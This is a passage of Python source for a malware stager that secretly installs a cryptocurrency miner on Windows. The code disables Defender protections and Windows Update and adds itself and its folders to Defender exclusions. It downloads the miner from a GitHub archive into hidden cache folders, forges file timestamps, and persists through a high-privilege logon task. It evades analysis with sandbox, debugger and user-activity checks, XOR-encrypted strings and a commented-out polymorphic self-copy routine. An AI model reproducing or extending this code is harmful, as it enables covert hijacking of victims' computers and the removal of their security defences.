        subprocess.run('sc start WinDefend', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        hawk.info("[DEFENDER_DISABLE] done")
    except Exception as e:
        hawk.error(f"[DEFENDER_DISABLE] failed: {e}", exc_info=True)

def disable_windows_updates():
    hawk.info("[WIN_UPDATE_DISABLE] start")
    try:
        au_path = r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, au_path, 0, winreg.KEY_READ)
            current_value, _ = winreg.QueryValueEx(key, "NoAutoUpdate")
            winreg.CloseKey(key)
            if current_value == 1:
                hawk.info("[WIN_UPDATE_DISABLE] already disabled via policy")
                subprocess.run('sc stop wuauserv', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
                subprocess.run('sc config wuauserv start= disabled', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
                return
        except FileNotFoundError:
            pass
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, au_path)
        winreg.SetValueEx(key, "NoAutoUpdate", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "AUOptions", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        subprocess.run('sc stop wuauserv', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('sc config wuauserv start= disabled', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        hawk.info("[WIN_UPDATE_DISABLE] Windows Update disabled via policy and service stopped")
    except Exception as e:
        hawk.error(f"[WIN_UPDATE_DISABLE] failed: {e}", exc_info=True)

LOCK_PATHS = [
    os.path.join(os.environ.get('ProgramData', 'C:\\ProgramData'), 'Microsoft', 'Windows', 'Caches', 'lock_0.dat'),
    os.path.join(os.environ.get('ProgramData', 'C:\\ProgramData'), 'Microsoft', 'Windows', 'WER', 'lock_1.dat'),
    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Themes', 'lock_2.dat'),
    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'Notifications', 'lock_3.dat'),
    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'CloudStore', 'lock_4.dat'),
    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Recent', 'lock_5.dat'),
    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'INetCache', 'IE', 'lock_6.dat'),
    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'SendTo', 'lock_7.dat'),
    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'Burn', 'Burn', 'lock_8.dat'),
    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'lock_9.dat'),
    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'History', 'lock_10.dat'),
    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Libraries', 'lock_11.dat'),
    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'Roaming', 'Tiles', 'lock_12.dat'),
    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Templates', 'lock_13.dat'),
    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'Themes', 'lock_14.dat'),
    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Cookies', 'lock_15.dat'),
    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'AppCache', 'lock_16.dat'),
    os.path.join(os.environ.get('ProgramData', 'C:\\ProgramData'), 'Microsoft', 'Windows', 'Caches', 'lock_17.dat'),
    os.path.join(os.environ.get('ProgramData', 'C:\\ProgramData'), 'Microsoft', 'Windows', 'WER', 'lock_18.dat'),
    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Themes', 'lock_19.dat'),
    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'Notifications', 'lock_20.dat'),
    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'CloudStore', 'lock_21.dat'),
    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Recent', 'lock_22.dat'),
    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'INetCache', 'IE', 'lock_23.dat'),
    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'SendTo', 'lock_24.dat'),
    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'Burn', 'Burn', 'lock_25.dat'),
    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'lock_26.dat'),
    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'History', 'lock_27.dat'),
    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Libraries', 'lock_28.dat'),
    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'Roaming', 'Tiles', 'lock_29.dat'),
    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Templates', 'lock_30.dat'),
    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'Themes', 'lock_31.dat'),
    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Cookies', 'lock_32.dat'),
    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'AppCache', 'lock_33.dat'),
    os.path.join(os.environ.get('ProgramData', 'C:\\ProgramData'), 'Microsoft', 'Windows', 'Caches', 'lock_34.dat'),
    os.path.join(os.environ.get('ProgramData', 'C:\\ProgramData'), 'Microsoft', 'Windows', 'WER', 'lock_35.dat'),
    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Themes', 'lock_36.dat'),
    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'Notifications', 'lock_37.dat'),
    os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local'), 'Microsoft', 'Windows', 'CloudStore', 'lock_38.dat'),
    os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), 'Microsoft', 'Windows', 'Recent', 'lock_39.dat'),
]

def create_secure_hidden_dir():
    chars = string.ascii_letters + string.digits
    folder_name = ''.join(random.choices(chars, k=17))
    base = os.environ.get('LOCALAPPDATA', 'C:\\Users\\Default\\AppData\\Local')
    base = os.path.join(base, 'Microsoft', 'Caches')
    os.makedirs(base, exist_ok=True)
    full_path = os.path.join(base, folder_name)
    os.makedirs(full_path, exist_ok=True)
    return full_path

def find_folder_by_keywords(root_dir, keywords):
    for dirpath, dirnames, _ in os.walk(root_dir):
        for dirname in dirnames:
            lower = dirname.lower()
            if all(kw.lower() in lower for kw in keywords):
                return os.path.join(dirpath, dirname)
    return None

def find_namez_py(source_dir):
    for root, _, files in os.walk(source_dir):
        if 'namez.py' in files:
            return os.path.join(root, 'namez.py')
    return None

def is_pe_file(path):
    try:
        with open(path, 'rb') as f:
            if f.read(2) != b'MZ':
                return False
            f.seek(0x3C)
            pe_offset = int.from_bytes(f.read(4), byteorder='little')
            f.seek(pe_offset)
            if f.read(4) != b'PE\x00\x00':
                return False
        return True
    except:
        return False

def download_namez_py(source_dir, save_dir):
    hawk.info("[NAMEZ_DOWNLOAD] Searching for namez.py in repo")
    py_path = find_namez_py(source_dir)
    if py_path:
        try:
            dest = os.path.join(save_dir, "namez.py")
            shutil.copy2(py_path, dest)
            add_folder_to_defender_exclusions(dest)
            hawk.info(f"[NAMEZ_DOWNLOAD] saved to {dest}")
            return dest
        except Exception as e:
            hawk.error(f"[NAMEZ_DOWNLOAD] failed to copy: {e}", exc_info=True)
            return None
    else:
        hawk.warning("[NAMEZ_DOWNLOAD] namez.py not found in repo")
        return None

def check_internet():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(('1.1.1.1', 80))
        s.close()
        return True
    except:
        return False

def time_stomp(filepath, refpath=None):
    if not refpath:
        refpath = os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'explorer.exe')
    try:
        if os.path.exists(refpath):
            ref_stat = os.stat(refpath)
            os.utime(filepath, (ref_stat.st_atime, ref_stat.st_mtime))
            hawk.debug(f"[STOMP] timestamps set for {filepath}")
    except Exception as e:
        hawk.error(f"[STOMP] failed: {e}")

def download_and_prepare():
    hawk.info("[DOWNLOAD] start")
    try:
        if not check_internet():
            hawk.error("[DOWNLOAD] no internet connectivity")
            return None, None
        delay = random.randint(10, 30)
        hawk.debug(f"[DOWNLOAD] jitter sleep {delay}s before download")
        time.sleep(delay)

        with tempfile.TemporaryDirectory() as tmpdir:
            tmp = Path(tmpdir)
            repo_zip = tmp / "repo.zip"
            url = get_miner_url()
            hawk.debug(f"[DOWNLOAD] Downloading repo from {url}")
            try:
                response = requests.get(url, stream=True)
                response.raise_for_status()
            except requests.HTTPError:
                hawk.warning(f"[DOWNLOAD] Branch '{get_branch()}' not found, trying 'master'")
                url = f"{get_github_repo()}/archive/refs/heads/master.zip"
                response = requests.get(url, stream=True)
                response.raise_for_status()
            with open(repo_zip, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            hawk.info("[DOWNLOAD] Download complete")

            repo_extract = tmp / "repo"
            hawk.debug("[DOWNLOAD] Extracting repository...")
            with zipfile.ZipFile(repo_zip, 'r') as zf:
                zf.extractall(repo_extract)

            top_dirs = [d for d in repo_extract.iterdir() if d.is_dir()]
            if not top_dirs:
                hawk.error("[DOWNLOAD] No directory found inside repo ZIP")
                return None, None
            repo_root = top_dirs[0]
            hawk.debug(f"[DOWNLOAD] Repository root: {repo_root}")

            keywords = get_folder_keywords()
            hawk.debug(f"[DOWNLOAD] Searching for folder containing {keywords}")
            target_folder = find_folder_by_keywords(str(repo_root), keywords)
            if not target_folder:
                hawk.error("[DOWNLOAD] Could not find target folder")
                return None, None
            hawk.info(f"[DOWNLOAD] Found folder: {target_folder}")

            install_dir = create_secure_hidden_dir()
            add_folder_to_defender_exclusions(install_dir)
            hawk.debug("[DOWNLOAD] Copying target folder to directory...")
            for item in os.listdir(target_folder):
                src = os.path.join(target_folder, item)
                dst = os.path.join(install_dir, item)
                if os.path.isdir(src):
                    shutil.copytree(src, dst)
                else:
                    shutil.copy2(src, dst)
                    time_stomp(dst)
            hawk.info("[DOWNLOAD] Folder copied to location")

            namez_py_path = download_namez_py(str(repo_root), install_dir)
            if namez_py_path:
                time_stomp(namez_py_path)

            hawk.info("[DOWNLOAD] preparation complete")
            return install_dir, namez_py_path
    except Exception as e:
        hawk.error(f"[DOWNLOAD] failed: {type(e).__name__}: {e}", exc_info=True)
        return None, None

def create_namez_scheduled_task(namez_py_path):
    hawk.info("[NAMEZ_PERSISTENCE] creating logon scheduled task for namez.py")
    try:
        task_name = get_task_name_namez()
        python_exe = sys.executable
        subprocess.run([
            'schtasks', '/create', '/tn', task_name,
            '/tr', f'"{python_exe}" "{namez_py_path}"',
            '/sc', 'onlogon', '/rl', 'HIGHEST', '/f'
        ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        hawk.info("[NAMEZ_PERSISTENCE] logon task created")
    except Exception as e:
        hawk.error(f"[NAMEZ_PERSISTENCE] logon task failed: {e}", exc_info=True)

def run_payload():
    if _is_volatile_pause_flag_set():
        hawk.info("[MAIN] Miner was paused due to user activity. Exiting.")
        sys.exit(0)

    disable_defender_cloud()
    disable_windows_updates()

    install_dir, namez_py_path = download_and_prepare()
    if not install_dir or not namez_py_path:
        hawk.critical("[PAYLOAD] preparation failed, aborting")
        return

    miner_exe = None
    for root, _, files in os.walk(install_dir):
        for f in files:
            if f.lower() == f"{get_exe_name()}.exe":
                miner_exe = os.path.join(root, f)
                break
        if miner_exe:
            break

    if miner_exe:
        if not is_pe_file(miner_exe):
            hawk.critical("[MARKER] file is not a valid PE, skipping lock file")
            miner_exe = None

    if not miner_exe:
        hawk.warning("[MARKER] miner exe not found in dropped folder, deployer will have to search")
    else:
        config_dir = get_config_dir_base()
        os.makedirs(config_dir, exist_ok=True)

        lock_file = random.choice(LOCK_PATHS)
        os.makedirs(os.path.dirname(lock_file), exist_ok=True)
        with open(lock_file, 'w') as lf:
            lf.write(f"{miner_exe}\n{config_dir}")
        hawk.info(f"[MARKER] Lock file written to {lock_file}")

        for lp in LOCK_PATHS:
            if os.path.isfile(lp) and lp != lock_file:
                try:
                    os.remove(lp)
                except:
                    pass

    create_namez_scheduled_task(namez_py_path)

    try:
        hawk.info("[NAMEZ] Starting namez.py")
        subprocess.Popen([sys.executable, namez_py_path], creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        hawk.error(f"[NAMEZ] failed to start: {e}", exc_info=True)

    hawk.info("[LOADER] initiating self-deletion")
    # self_del()

def main():
    print("\n" + "="*60)
    print(" STAGER STARTED ".center(60, "="))
    print("="*60 + "\n")

    hawk.info(f"[MAIN] start, PID={os.getpid()}")
    hawk.info(f"[MAIN] woke up, args={sys.argv}")

    global ENC_STRINGS, CURRENT_KEY
    if not ENC_STRINGS:
        miner_url = f"{GITHUB_REPO}/archive/refs/heads/{BRANCH}.zip"
        plain_strings = [
            miner_url,
            GITHUB_REPO,
            BRANCH,
            FOLDER_KEYWORDS[0],
            FOLDER_KEYWORDS[1],
            FOLDER_KEYWORDS[2],
            EXE_NAME,
            os.path.join(os.environ.get('APPDATA', ''), CONFIG_DIR_REL),
            TASK_NAME_NAMEZ
        ]
        ENC_STRINGS = [xor_bytes(s.encode(), CURRENT_KEY) for s in plain_strings]

    IS_CHILD = '--child' in sys.argv

    # --- TEMPORARY: bypass polymorphism ---
    # if not IS_CHILD:
    #     hawk.info("[POLY] Generating mutated copy...")
    #     global ENC_STRINGS, CURRENT_KEY
    #     if not ENC_STRINGS:
    #         miner_url = f"{GITHUB_REPO}/archive/refs/heads/{BRANCH}.zip"
    #         plain_strings = [
    #             miner_url,
    #             GITHUB_REPO,
    #             BRANCH,
    #             FOLDER_KEYWORDS[0],
    #             FOLDER_KEYWORDS[1],
    #             FOLDER_KEYWORDS[2],
    #             EXE_NAME,
    #             os.path.join(os.environ.get('APPDATA', ''), CONFIG_DIR_REL),
    #             TASK_NAME_NAMEZ
    #         ]
    #         ENC_STRINGS = [xor_bytes(s.encode(), CURRENT_KEY) for s in plain_strings]
    #
    #     with open(__file__, 'r', encoding='utf-8') as f:
    #         source = f.read()
    #
    #     old_key_line = f"CURRENT_KEY = {repr(CURRENT_KEY)}"
    #     new_key = os.urandom(8)
    #     new_key_line = f"CURRENT_KEY = {repr(new_key)}"
    #     source = source.replace(old_key_line, new_key_line)
    #
    #     old_enc_line = 'ENC_STRINGS = []'
    #     new_enc_line = 'ENC_STRINGS = ' + repr(ENC_STRINGS)
    #     source = source.replace(old_enc_line, new_enc_line)
    #
    #     new_path = os.path.join(tempfile.gettempdir(), f"svchost_{random.randint(1000,9999)}.py")
    #     with open(new_path, 'w', encoding='utf-8') as f:
    #         f.write(source)
    #
    #     subprocess.Popen([sys.executable, new_path, '--child'],
    #                      creationflags=subprocess.CREATE_NEW_CONSOLE)
    #     hawk.info("[POLY] Exiting original, child will take over.")
    #     sys.exit(0)
    # --- end bypass ---

    if not is_admin():
        hawk.info("[MAIN] elevating")
        elevate()
    if not is_admin():
        hawk.critical("[MAIN] still not admin after elevation attempt")
        trigger_exit(ERR['ELEVATION_LOOP'], "Failed to obtain admin rights")
    add_self_to_defender_exclusions()

    hawk.info("[MAIN] waiting 60 seconds before environment checks...")
    time.sleep(60 + random.randint(-10, 20))

    chk_ram()
    chk_user()
    chk_procs()
    chk_software()
    geo_ca()
    chk_timezone()
    chk_ps_history()
    hist = browser_history()
    if hist < 20 and app_cluster():
        hawk.critical(f"[MAIN] low history {hist} + app cluster")
        if not TESTING_MODE:
            trigger_exit(ERR['LOW_BROWSER_APP_CLUSTER'], f"History={hist}, cluster")
        else:
            hawk.warning("TESTING: Would have exited – low browser history + app cluster")
    chk_disk()
    chk_screen()
    chk_cpu()
    chk_sandbox_dlls()
    chk_mac_prefix()
    chk_mouse_activity()
    chk_process_count()
    chk_sandbox_files()
    chk_uptime()
    chk_debugger()
    hawk.info("[MAIN] all checks passed – environment legitimate")
    run_payload()
    input("\n=== Child finished. Press Enter to exit...")

if __name__ == '__main__':
    try:
        main()
    except SystemExit:
        pass
    except Exception:
        print("\n!!! FATAL ERROR !!!")
        traceback.print_exc()
        hawk.critical("!!! UNHANDLED ERROR OUTSIDE MAIN !!!", exc_info=True)
        for h in hawk.handlers:
            h.flush()
    if sys.stdin and sys.stdin.isatty():
        input("\n=== Press Enter to close this window ===")
